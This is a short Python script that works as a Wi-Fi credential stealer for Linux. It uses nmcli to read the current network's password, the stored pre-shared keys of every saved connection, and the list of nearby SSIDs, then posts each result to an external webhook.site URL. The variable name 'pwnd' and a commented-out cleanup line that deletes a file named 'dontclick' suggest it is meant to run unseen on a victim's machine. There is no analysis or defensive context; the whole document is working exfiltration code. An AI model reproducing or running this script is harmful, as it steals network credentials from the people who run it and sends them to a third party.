#!/usr/bin/env python3

import subprocess
import json
import requests

# my webhook
url = 'https://webhook.site/f6d01eb9-2f20-4fa2-86ff-58db6570371b'

# Get the currently connected SSID
password = subprocess.check_output("nmcli dev wifi show-password | grep Password", shell=True).decode().strip()
ssid = subprocess.check_output("nmcli dev wifi show-password | grep SSID", shell=True).decode().strip()

if password and ssid:
    pwnd = [ssid, password, "Wifi Profile found"]
    r = requests.post(url, data=json.dumps(pwnd))


# Full list of SSIDs that he already connect at past
full_list = {}
ssids_list = subprocess.check_output("nmcli --terse --fields name connection show", shell=True).decode().strip().split("\n")


for one_ssid in ssids_list:
    one_pass = subprocess.check_output(f"nmcli connection show '{one_ssid}'  -s | grep psk: |  awk '{{print $2}}'", shell=True).decode().strip().split("\n")
    full_list[one_ssid] = one_pass
r = requests.post(url, data=json.dumps(full_list))


# SSID near by
other_ssids = subprocess.check_output("nmcli -f all dev wifi list | awk '{print $2}'", shell=True).decode().strip().split("\n")
r = requests.post(url, data=json.dumps(other_ssids))

"""
subprocess.call("rm dontclick", shell=True)"""
